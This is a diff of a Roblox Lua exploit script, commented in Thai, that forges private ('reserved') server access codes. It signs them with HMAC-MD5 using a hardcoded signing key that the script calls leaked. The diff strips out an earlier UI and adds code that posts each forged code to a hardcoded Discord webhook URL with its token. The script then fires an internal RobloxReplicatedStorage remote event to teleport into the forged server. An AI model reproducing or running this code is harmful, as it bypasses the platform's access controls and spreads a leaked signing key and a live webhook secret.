@@ -1,17 +1,7 @@
--- =============================================
--- Reserved Server Manager (ใช้โค้ดเดิม + UI ครบวงจร)
--- =============================================
+local HttpService = game:GetService("HttpService")
 
--- ตรวจสอบว่าเป็น LocalScript
-if not game:IsLoaded() then
-    game.Loaded:Wait()
-end
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1419002326898704629/wv-PsR1_nOZsnumOmq1t-1xisDInKtPhjlB0xud7Tx05czjMoz0KiFKDmE_dVAoCgSsk" -- เปลี่ยนเป็น URL ของ webhook ของคุณ
 
-local player = game.Players.LocalPlayer
-local placeId = game.PlaceId
-
--- ========== วางโค้ด md5, hmac, base64, GenerateReservedServerCode ทั้งหมดที่นี่ ==========
--- (ฉันย่อไว้เพื่อความกระชับ — คุณต้องวางโค้ดเต็มจากคำตอบก่อนหน้า!)
 local md5 = {}
 local hmac = {}
 local base64 = {}
@@ -227,17 +217,14 @@ do
 	end
 end
 
--- [วางโค้ด MD5/HMAC/Base64 ทั้งหมดตรงนี้ — เหมือนในคำตอบแรกของฉัน]
-
--- [วางฟังก์ชัน GenerateReservedServerCode ตรงนี้]
 local function GenerateReservedServerCode(placeId)
 	local uuid = {}
 	for i = 1, 16 do
 		uuid[i] = math.random(0, 255)
 	end
 
-	uuid[7] = bit32.bor(bit32.band(uuid[7], 0x0F), 0x40) -- v4
-	uuid[9] = bit32.bor(bit32.band(uuid[9], 0x3F), 0x80) -- RFC 4122
+	uuid[7] = bit32.bor(bit32.band(uuid[7], 0x0F), 0x40)
+	uuid[9] = bit32.bor(bit32.band(uuid[9], 0x3F), 0x80)
 
 	local firstBytes = ""
 	for i = 1, 16 do
@@ -256,7 +243,7 @@ local function GenerateReservedServerCode(placeId)
 
 	local content = firstBytes .. placeIdBytes
 
-	local SUPERDUPERSECRETROBLOXKEYTHATTHEYDIDNTCHANGEEVERSINCEFOREVER = "e4Yn8ckbCJtw2sv7qmbg" -- legacy leaked key from ages ago that still works due to roblox being roblox.
+	local SUPERDUPERSECRETROBLOXKEYTHATTHEYDIDNTCHANGEEVERSINCEFOREVER = "e4Yn8ckbCJtw2sv7qmbg"
 	local signature = hmac.new(SUPERDUPERSECRETROBLOXKEYTHATTHEYDIDNTCHANGEEVERSINCEFOREVER, content, md5.sum)
 
 	local accessCodeBytes = signature .. content
@@ -275,173 +262,33 @@ local function GenerateReservedServerCode(placeId)
 	return accessCode, gameCode
 end
 
--- ========== ระบบจัดการเซิร์ฟเวอร์ ==========
-local ServerManager = {}
-
--- เก็บ accessCode ปัจจุบัน
-function ServerManager.GetSavedCode()
-    return _G.ReservedAccessCode
+-- ส่งข้อมูลไปยัง webhook
+local function SendToWebhook(accessCode, gameCode, placeId)
+	local data = {
+		content = string.format("**Access Code Generated**\n```\nAccess Code: %s\nGame Code: %s\nPlace ID: %s\n```", 
+			accessCode, gameCode, tostring(placeId))
+	}
+	
+	local success, response = pcall(function()
+		return HttpService:PostAsync(
+			WEBHOOK_URL,
+			HttpService:JSONEncode(data),
+			Enum.HttpContentType.ApplicationJson,
+			false
+		)
+	end)
+	
+	if success then
+		print("ส่งข้อมูลไปยัง webhook สำเร็จ")
+	else
+		warn("ไม่สามารถส่งข้อมูลไปยัง webhook ได้: " .. tostring(response))
+	end
 end
 
-function ServerManager.SaveCode(code)
-    _G.ReservedAccessCode = code
-end
+local accessCode, gameCode = GenerateReservedServerCode(game.PlaceId)
 
-function ServerManager.CreateNewServer()
-    -- ลบโค้ดเก่าทิ้งทุกครั้ง → สร้างใหม่เสมอ!
-    local accessCode, _ = GenerateReservedServerCode(placeId)
-    ServerManager.SaveCode(accessCode)
+-- ส่งไปยัง webhook ก่อน
+SendToWebhook(accessCode, gameCode, game.PlaceId)
 
-    -- ส่งไปยังเซิร์ฟเวอร์
-    if game.ReplicatedStorage:FindFirstChild("ContactListIrisInviteTeleport") then
-        game.ReplicatedStorage.ContactListIrisInviteTeleport:FireServer(placeId, "", accessCode)
-    else
-        warn("⚠️ RemoteEvent 'ContactListIrisInviteTeleport' ไม่พบ!")
-    end
-
-    print("✅ สร้างเซิร์ฟเวอร์ใหม่:", accessCode)
-    return accessCode
-end
-
--- คัดลอกข้อความไปยังคลิปบอร์ด (ถ้าใช้ได้)
-function ServerManager.CopyToClipboard(text)
-    local Players = game:GetService("Players")
-    local player = Players.LocalPlayer
-
-    -- วิธีคัดลอกคลิปบอร์ดที่ถูกต้องใน Roblox (เฉพาะเดสก์ท็อป)
-    local success, err = pcall(function()
-        player:SetClipboard(text)
-    end)
-
-    if success then
-        print("✅ คัดลอก Access Code ไปยังคลิปบอร์ดแล้ว!")
-        return true
-    else
-        warn("⚠️ ไม่สามารถคัดลอกอัตโนมัติได้ (อาจอยู่ในเบราว์เซอร์)")
-        print("📋 กรุณาคัดลอกด้วยมือ:", text)
-        return false
-    end
-end
-
--- Teleport ไปยังเซิร์ฟเวอร์ด้วย access code
-function ServerManager.TeleportToServer(accessCode)
-    if not accessCode or accessCode == "" then
-        warn("❌ กรุณาใส่ Access Code")
-        return
-    end
-
-    -- ใช้ TeleportService อย่างเป็นทางการ (แม้จะใช้โค้ดเก่า)
-    local TS = game:GetService("TeleportService")
-    local success, err = pcall(function()
-        TS:TeleportToPrivateServer(placeId, accessCode, {player})
-    end)
-
-    if not success then
-        warn("❌ ไม่สามารถเข้าร่วมเซิร์ฟเวอร์ได้:", err)
-        -- ลองใช้วิธีเก่า (FireServer) เป็นทางเลือก
-        if game.ReplicatedStorage:FindFirstChild("ContactListIrisInviteTeleport") then
-            game.ReplicatedStorage.ContactListIrisInviteTeleport:FireServer(placeId, accessCode, "")
-        end
-    end
-end
-
--- ========== สร้าง UI ==========
-local gui = Instance.new("ScreenGui")
-gui.Name = "ReservedServerUI"
-gui.ResetOnSpawn = false
-gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-
-local frame = Instance.new("Frame")
-frame.Size = UDim2.new(0, 300, 0, 220)
-frame.Position = UDim2.new(0.5, -150, 0.2, 0)
-frame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
-frame.BorderSizePixel = 0
-frame.Parent = gui
-
-local title = Instance.new("TextLabel")
-title.Text = "🔒 Reserved Server Manager"
-title.Size = UDim2.new(1, 0, 0, 30)
-title.BackgroundTransparency = 1
-title.Font = Enum.Font.GothamBold
-title.TextSize = 18
-title.TextColor3 = Color3.fromRGB(255, 255, 100)
-title.Parent = frame
-
--- ปุ่ม: สร้างเซิร์ฟเวอร์ใหม่
-local btnCreate = Instance.new("TextButton")
-btnCreate.Text = "🆕 สร้างเซิร์ฟเวอร์ใหม่"
-btnCreate.Size = UDim2.new(1, -20, 0, 40)
-btnCreate.Position = UDim2.new(0, 10, 0, 40)
-btnCreate.Font = Enum.Font.Gotham
-btnCreate.TextSize = 16
-btnCreate.BackgroundColor3 = Color3.fromRGB(40, 100, 40)
-btnCreate.TextColor3 = Color3.fromRGB(255, 255, 255)
-btnCreate.Parent = frame
-
-btnCreate.MouseButton1Click:Connect(function()
-    local code = ServerManager.CreateNewServer()
-    if code then
-        -- อัปเดต UI หรือแจ้งเตือน
-        print("📋 คัดลอกโค้ดนี้ส่งให้เพื่อน:", code)
-    end
-end)
-
--- ปุ่ม: คัดลอกโค้ดปัจจุบัน
-local btnCopy = Instance.new("TextButton")
-btnCopy.Text = "📋 คัดลอก Access Code"
-btnCopy.Size = UDim2.new(1, -20, 0, 40)
-btnCopy.Position = UDim2.new(0, 10, 0, 90)
-btnCopy.Font = Enum.Font.Gotham
-btnCopy.TextSize = 16
-btnCopy.BackgroundColor3 = Color3.fromRGB(60, 60, 120)
-btnCopy.TextColor3 = Color3.fromRGB(255, 255, 255)
-btnCopy.Parent = frame
-
-btnCopy.MouseButton1Click:Connect(function()
-    local code = ServerManager.GetSavedCode()
-    if code then
-        local success = ServerManager.CopyToClipboard(code)
-        if success then
-            print("✅ คัดลอก Access Code แล้ว!")
-        else
-            print("📋 Access Code (คัดลอกเอง):", code)
-        end
-    else
-        warn("❌ ยังไม่มีเซิร์ฟเวอร์! กด 'สร้างเซิร์ฟเวอร์ใหม่' ก่อน")
-    end
-end)
-
--- ช่องใส่โค้ด + ปุ่มเข้าร่วม
-local inputBox = Instance.new("TextBox")
-inputBox.Size = UDim2.new(1, -20, 0, 30)
-inputBox.Position = UDim2.new(0, 10, 0, 140)
-inputBox.PlaceholderText = "ใส่ Access Code ที่นี่..."
-inputBox.TextSize = 14
-inputBox.Font = Enum.Font.Code
-inputBox.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
-inputBox.TextColor3 = Color3.fromRGB(255, 255, 255)
-inputBox.Parent = frame
-
-local btnJoin = Instance.new("TextButton")
-btnJoin.Text = "🚀 เข้าร่วมเซิร์ฟเวอร์"
-btnJoin.Size = UDim2.new(1, -20, 0, 30)
-btnJoin.Position = UDim2.new(0, 10, 0, 180)
-btnJoin.Font = Enum.Font.GothamBold
-btnJoin.TextSize = 14
-btnJoin.BackgroundColor3 = Color3.fromRGB(100, 60, 60)
-btnJoin.TextColor3 = Color3.fromRGB(255, 255, 255)
-btnJoin.Parent = frame
-
-btnJoin.MouseButton1Click:Connect(function()
-    ServerManager.TeleportToServer(inputBox.Text)
-end)
-
--- วาง GUI
-gui.Parent = player:WaitForChild("PlayerGui")
-
--- ========== แจ้งสถานะเริ่มต้น ==========
-if ServerManager.GetSavedCode() then
-    print("ℹ️ มี Access Code เดิมอยู่:", ServerManager.GetSavedCode())
-else
-    print("ℹ️ กดปุ่ม 'สร้างเซิร์ฟเวอร์ใหม่' เพื่อเริ่มต้น")
-end
+-- จากนั้นค่อย teleport
+game.RobloxReplicatedStorage.ContactListIrisInviteTeleport:FireServer(game.PlaceId, "", accessCode)
